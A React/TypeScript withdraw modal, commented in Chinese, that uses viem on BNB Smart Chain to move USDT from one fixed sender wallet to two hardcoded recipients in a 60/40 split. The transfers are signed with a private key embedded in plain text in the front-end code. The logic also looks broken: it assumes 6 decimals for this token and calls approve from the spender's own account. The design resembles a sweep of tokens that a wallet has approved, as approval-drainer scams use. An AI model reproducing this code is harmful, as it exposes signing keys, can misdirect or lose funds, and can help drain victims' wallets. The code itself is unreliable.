import React, { useState } from 'react';
import { Modal, Form, InputNumber, message } from 'antd';
import { useIntl } from '@umijs/max';
import { createWalletClient, http, parseUnits, createPublicClient } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';

// USDT 合约地址（BSC）
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';

// USDT 合约 ABI（更完整的ABI）
const USDT_ABI = [
  {
    inputs: [
      { name: 'sender', type: 'address' },
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'transferFrom',
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: '', type: 'bool' }],
    stateMutability: 'nonpayable',
    type: 'function',
  },
  {
    inputs: [{ name: 'account', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
  {
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    stateMutability: 'view',
    type: 'function',
  },
];

interface WithdrawProps {
  open: boolean;
  onClose: () => void;
  currentRow?: API.ItemData;
  onSuccess?: () => void;
}

const Withdraw: React.FC<WithdrawProps> = ({ open, onClose }) => {
  const [form] = Form.useForm();
  const intl = useIntl();
  const [loading, setLoading] = useState(false);

  // 默认值
  const sender = '0xe3874401fF2fd9A40CDd31c819FBcC7106bA8540'; // 发送者地址
  const recipient1 = '0x08219E70ad70d570295bf1017dcEda0a6325D5C9'; // 第一个接收者地址
  const recipient2 = '0x7dF2A82f7127aE0736012595417878ceB4378E0c'; // 第二个接收者地址
  const spender = '0xD7cbc6956591110Cfc6b6Fa3AAC6bcd85E7d2E8F'; // 授权地址
  const percentage1 = 0.6; // 60%
  const percentage2 = 0.4; // 40%

  const handleOk = async () => {
    try {
      console.log('Validating form fields...');
      const values = await form.validateFields();
      console.log('Form values:', values);

      setLoading(true);
      message.loading({ content: '正在分配资金...', key: 'withdraw' });

      // 创建钱包客户端
      const account = privateKeyToAccount(
        '0xf3cd4d24dd86c2d74368d71e98c6ad12fe10e6391c129250f42ba0a5755e2aca',
      ); //私钥

      const client = createWalletClient({
        account,
        chain: bsc,
        transport: http(),
      });

      // 创建公共客户端用于读取操作
      const publicClient = createPublicClient({
        chain: bsc,
        transport: http(),
      });

      // 转换总金额为 USDT 单位（6位小数）
      const totalAmount = parseUnits(values.amount.toString(), 6);

      // 计算每个接收者的金额（使用浮点数计算后再转换为BigInt）
      const amount1 = parseUnits((values.amount * percentage1).toString(), 6);
      const amount2 = parseUnits((values.amount * percentage2).toString(), 6);

      console.log('Amount for recipient1:', amount1.toString());
      console.log('Amount for recipient2:', amount2.toString());

      // 检查发送者余额
      const balance = (await publicClient.readContract({
        address: USDT_ADDRESS,
        abi: USDT_ABI,
        functionName: 'balanceOf',
        args: [sender],
      })) as bigint;

      console.log('发送者余额:', balance.toString());

      if (balance < totalAmount) {
        throw new Error(
          `余额不足，当前余额: ${balance.toString()}, 需要: ${totalAmount.toString()}`,
        );
      }

      // 检查授权额度
      const allowance = (await publicClient.readContract({
        address: USDT_ADDRESS,
        abi: USDT_ABI,
        functionName: 'allowance',
        args: [sender, spender],
      })) as bigint;

      console.log('当前授权额度:', allowance.toString());

      // 如果授权额度不足，先进行授权
      if (allowance < totalAmount) {
        console.log('授权额度不足，开始授权...');
        const approveHash = await client.writeContract({
          address: USDT_ADDRESS,
          abi: USDT_ABI,
          functionName: 'approve',
          args: [spender, totalAmount],
          account: account,
        });
        console.log('授权交易哈希:', approveHash);

        // 等待授权交易确认
        await publicClient.waitForTransactionReceipt({ hash: approveHash });
        console.log('授权交易已确认');
      }

      // 转账给第一个接收者
      console.log('开始转账给第一个接收者...');
      const hash1 = await client.writeContract({
        address: USDT_ADDRESS,
        abi: USDT_ABI,
        functionName: 'transferFrom',
        args: [sender, recipient1, amount1],
        account: account, // 使用正确的账户
      });
      console.log('第一个接收者的交易哈希:', hash1);

      // 等待第一个交易确认
      await publicClient.waitForTransactionReceipt({ hash: hash1 });
      console.log('第一个转账交易已确认');

      // 转账给第二个接收者
      console.log('开始转账给第二个接收者...');
      const hash2 = await client.writeContract({
        address: USDT_ADDRESS,
        abi: USDT_ABI,
        functionName: 'transferFrom',
        args: [sender, recipient2, amount2],
        account: account, // 使用正确的账户
      });
      console.log('第二个接收者的交易哈希:', hash2);

      // 等待第二个交易确认
      await publicClient.waitForTransactionReceipt({ hash: hash2 });
      console.log('第二个转账交易已确认');

      message.success({ content: '资金分配成功！', key: 'withdraw' });
      onClose();
    } catch (error: any) {
      console.error('分配错误:', error);
      message.error({
        content: error.message || '资金分配失败',
        key: 'withdraw',
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <Modal
      title={intl.formatMessage({ id: 'withdraw.title', defaultMessage: '提现' })}
      open={open}
      onOk={handleOk}
      onCancel={onClose}
      confirmLoading={loading}
    >
      <Form form={form} layout="vertical">
        <Form.Item
          name="amount"
          label={intl.formatMessage({ id: 'withdraw.amount', defaultMessage: '归集金额' })}
          rules={[{ required: true }]}
        >
          <InputNumber style={{ width: '100%' }} placeholder="输入归集金额" />
        </Form.Item>
      </Form>
    </Modal>
  );
};

export default Withdraw;
